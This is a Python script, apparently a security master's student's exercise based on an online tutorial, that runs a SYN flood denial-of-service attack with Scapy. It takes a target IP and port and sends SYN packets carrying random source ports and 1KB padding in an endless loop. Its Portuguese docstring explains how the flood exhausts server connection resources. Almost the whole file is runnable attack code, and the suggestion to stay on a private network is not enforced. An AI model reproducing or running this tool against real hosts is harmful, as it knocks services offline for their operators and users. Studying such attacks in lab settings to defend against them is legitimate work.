# Paulo Abade - 23919
# Mestrado de Engenharia de Segurança Informática
# Iniciado em 19/10/2025
# Última atualização: 06/02/2026

# Faz um ataque de SYN Flood a um IP e a uma porta que tenham sido especificados pelo utilizador
# Foi seguido o tutorial de: https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

from scapy.all import *
import ipaddress


def syn_attack():
    """
    Executa a rotina de inundação SYN Flood contra um alvo específico.

    A função solicita um IP e uma porta, constrói pacotes TCP customizados com 
    a flag 'S' (SYN) ativada e envia-os em loop. Cada pacote utiliza uma porta 
    de origem aleatória para simular múltiplos clientes distintos.

    Mecanismo de Exploração:
        1. O atacante envia um pacote SYN (Pedido de conexão).
        2. O servidor responde com SYN-ACK e reserva recursos na memória.
        3. O atacante ignora o SYN-ACK e não envia o ACK final.
        4. O servidor mantém a conexão pendente até atingir o timeout.

    Análise técnica:
        - Camada 3 (IP): Define o endereço de destino (dst).
        - Camada 4 (TCP): Define portas aleatórias (RandShort), porta alvo e flag SYN (flags="S").
        - Payload (Raw): Adiciona 1KB de dados irrelevantes para aumentar o consumo de banda.
    """
    print("SYN Flood Attack - Protocol Vulnerability Test\n")
    
    # Validação do endereço IP do alvo
    is_an_ip = False
    target_ip = ""
    while not is_an_ip:
        target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            is_an_ip = True
        except ValueError:
            print("Erro: Formato de IP inválido")

    # Validação do número da porta de destino
    isnumber = False
    target_port = 80
    while not isnumber:
        try:
            target_port = int(input("Insira uma porta válida entre 0 e 65535 (ex: 80, 443, etc...): \n"))
            if 1 <= target_port <= 65535:
                isnumber = True
            else:
                print("Erro: A porta deve estar entre 1 e 65535")
        except ValueError:
            print("Erro: Insira apenas números")
    
    print(f"[*] A iniciar SYN Flood em {target_ip}:{target_port}...")

    # Construção do pacote Scapy
    # IP(dst=...) define o destino na Camada de Rede
    ip_layer = IP(dst=target_ip)
    
    # TCP(...) define a Camada de Transporte. 
    # sport=RandShort() gera portas de origem aleatórias para dificultar a filtragem básica.
    # flags="S" define o bit SYN.
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")  

    # Camada de Dados (Payload) para aumentar o overhead do pacote
    raw_layer = Raw(b"X"*1024)

    # Composição final do pacote (Stacking de camadas)
    p = ip_layer / tcp_layer / raw_layer 
    
    try:
        # Envio em loop infinito (L3 send). loop=1 garante o envio contínuo.
        send(p, loop=1, verbose=0) 
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo utilizador.")